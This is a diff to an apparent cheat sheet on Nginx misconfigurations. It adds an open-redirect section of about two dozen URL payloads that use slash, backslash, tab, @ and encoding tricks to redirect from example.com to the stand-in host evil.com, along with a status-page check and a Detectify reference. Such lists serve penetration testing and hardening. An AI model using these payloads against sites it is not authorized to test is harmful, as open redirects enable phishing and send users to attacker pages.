@@ -21,7 +21,41 @@ https://example.com/folder1/folder2/static../static/main.css
 https://example.com/folder1/folder2/static../%s/main.css
 ```
 
-3. Nginx status page
+3. Open redirect
+This is because of misconfiguration
+```
+https://example.com/%5cevil.com
+https://example.com////\;@evil.com
+https://example.com////evil.com
+https://example.com///evil.com
+https://example.com///evil.com/%2f%2e%2e
+https://example.com///evil.com@//
+https://example.com///{{RootURL}}evil.com/%2f%2e%2e
+https://example.com//;@evil.com
+https://example.com//\/evil.com/
+https://example.com//\@evil.com
+https://example.com//\evil.com
+https://example.com//\tevil.com/
+https://example.com//evil.com/%2F..
+https://example.com//evil.com//
+https://example.com//evil.com@//
+https://example.com//evil.com\tevil.com/
+https://example.com//https://evil.com@//
+https://example.com/<>//evil.com
+https://example.com/\/\/evil.com/
+https://example.com/\/evil.com
+https://example.com/\evil.com
+https://example.com/evil.com
+https://example.com/evil.com/%2F..
+https://example.com/evil.com/
+https://example.com/evil.com/..;/css
+https://example.com/https:evil.com
+```
+
+4. Nginx status page
 ```
 https://example.com/nginx_status
 ```
+
+## References
+- [Detectify](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/)
